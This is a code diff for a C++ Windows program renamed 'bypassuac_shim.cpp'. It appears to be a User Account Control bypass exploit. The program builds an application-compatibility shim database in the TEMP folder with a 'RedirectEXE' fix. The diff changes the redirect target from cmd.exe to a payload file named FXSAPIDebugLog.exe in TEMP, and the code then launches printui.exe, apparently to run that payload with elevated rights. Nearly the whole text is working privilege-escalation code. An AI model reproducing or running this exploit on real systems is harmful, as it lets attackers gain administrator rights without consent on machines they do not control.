@@ -1,54 +1,16 @@
-// elevator.cpp : Defines the entry point for the console application.
+// bypassuac_shim.cpp : Defines the entry point for the console application.
 //
 
 #include "stdafx.h"
-#include "apphlp.h"  
-
-BOOL LoadAppHelpFunctions(HMODULE hAppHelp, PAPPHELP_API pAppHelp) {  
-	if(!(pAppHelp->SdbBeginWriteListTag =   
-		(SdbBeginWriteListTagPtr)GetProcAddress(hAppHelp, "SdbBeginWriteListTag")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbCloseDatabase =   
-		(SdbCloseDatabasePtr)GetProcAddress(hAppHelp, "SdbCloseDatabase")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbCloseDatabaseWrite =   
-		(SdbCloseDatabaseWritePtr)GetProcAddress(hAppHelp, "SdbCloseDatabaseWrite")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbCommitIndexes =   
-		(SdbCommitIndexesPtr)GetProcAddress(hAppHelp, "SdbCommitIndexes")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbCreateDatabase =   
-		(SdbCreateDatabasePtr)GetProcAddress(hAppHelp, "SdbCreateDatabase")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbDeclareIndex =   
-		(SdbDeclareIndexPtr)GetProcAddress(hAppHelp, "SdbDeclareIndex")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbEndWriteListTag =   
-		(SdbEndWriteListTagPtr)GetProcAddress(hAppHelp, "SdbEndWriteListTag")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbStartIndexing =   
-		(SdbStartIndexingPtr)GetProcAddress(hAppHelp, "SdbStartIndexing")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbStopIndexing =   
-		(SdbStopIndexingPtr)GetProcAddress(hAppHelp, "SdbStopIndexing")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbWriteBinaryTag =   
-		(SdbWriteBinaryTagPtr)GetProcAddress(hAppHelp, "SdbWriteBinaryTag")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbWriteDWORDTag =   
-		(SdbWriteDWORDTagPtr)GetProcAddress(hAppHelp, "SdbWriteDWORDTag")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbWriteQWORDTag =   
-		(SdbWriteQWORDTagPtr)GetProcAddress(hAppHelp, "SdbWriteQWORDTag")))  
-		return FALSE;  
-	if(!(pAppHelp->SdbWriteStringTag =   
-		(SdbWriteStringTagPtr)GetProcAddress(hAppHelp, "SdbWriteStringTag")))  
-		return FALSE;  
-
-	return TRUE;  
-}  
+#include "bypassuac_shim.h"  
 
 int main(int argc, char *argv[]) {  
+
+	WCHAR wszTempPath[MAX_PATH + 1] = { 0 };
+	WCHAR wszUninstall[MAX_PATH + 1] = { 0 };
+	WCHAR wszPayloadTempPath[MAX_PATH + 1] = { 0 };
+	WCHAR wszShExecVerb[MAX_PATH + 1] = L"open";
+
 	HMODULE hAppHelp = LoadLibrary(L"apphelp.dll");  
 	APPHELP_API api = {0};  
 	INDEXID idx1, idx2, idx3, idx4, idx5, idx6, idx7, idx8, idx9;  
@@ -58,13 +20,12 @@ int main(int argc, char *argv[]) {
 		0x4f, 0x9f, 0x46, 0xc7, 0xec, 0xf8, 0x13, 0x64, 0x5e};  
 	BYTE binBuff2[] = {0x13, 0x08, 0x37, 0x3a, 0x49, 0x21, 0x7d,   
 		0x40, 0xb2, 0xcd, 0xee, 0x83, 0xdd, 0x35, 0x3d, 0x83};  
-	WCHAR wszTempPath[MAX_PATH+1] = {0};  
-	WCHAR wszUninstall[MAX_PATH+1] = {0};  
+
 	SHELLEXECUTEINFO ShExec = {0};  
 	ShExec.cbSize = sizeof(SHELLEXECUTEINFO);  
 	ShExec.fMask = SEE_MASK_NOCLOSEPROCESS;  
 	ShExec.hwnd = NULL;  
-	ShExec.lpVerb = L"open";  
+	ShExec.lpVerb = wszShExecVerb;
 	ShExec.lpDirectory = NULL;  
 	ShExec.hInstApp = NULL;  
 
@@ -75,6 +36,10 @@ int main(int argc, char *argv[]) {
 
 	GetEnvironmentVariable(L"TEMP", wszTempPath, MAX_PATH);  
 	wcscat_s(wszTempPath, MAX_PATH, L"\\mydb.sdb");
+
+	GetEnvironmentVariable(L"TEMP", wszPayloadTempPath, MAX_PATH);
+	wcscat_s(wszPayloadTempPath, MAX_PATH, L"\\FXSAPIDebugLog.exe");
+
 	db = api.SdbCreateDatabase(wszTempPath, DOS_PATH);  
 	api.SdbDeclareIndex(db, TAG_TYPE_LIST, 24577, 1, TRUE, &idx1);  
 	api.SdbDeclareIndex(db, TAG_TYPE_LIST, 24587, 0, FALSE, &idx2);  
@@ -114,7 +79,7 @@ int main(int argc, char *argv[]) {
 	api.SdbEndWriteListTag(db, tId4);  
 	tId5 = api.SdbBeginWriteListTag(db, 28681);  
 	api.SdbWriteStringTag(db, 24577, L"RedirectEXE"); // Fix type  
-	api.SdbWriteStringTag(db, 24584, L"c:\\windows\\system32\\cmd.exe"); // Executable to redirect to  
+	api.SdbWriteStringTag(db, 24584, wszPayloadTempPath); // Executable to redirect to  
 	api.SdbEndWriteListTag(db, tId5);  
 	api.SdbEndWriteListTag(db, tId3);  
 	api.SdbStopIndexing(db, idx9);  
@@ -137,6 +102,7 @@ int main(int argc, char *argv[]) {
 		DeleteFile(wszTempPath);  
 		return 1;  
 	}  
+
 	WaitForSingleObject(ShExec.hProcess, INFINITE);  
 	ShExec.lpFile = L"printui.exe";  
 	ShExec.lpParameters = NULL;  
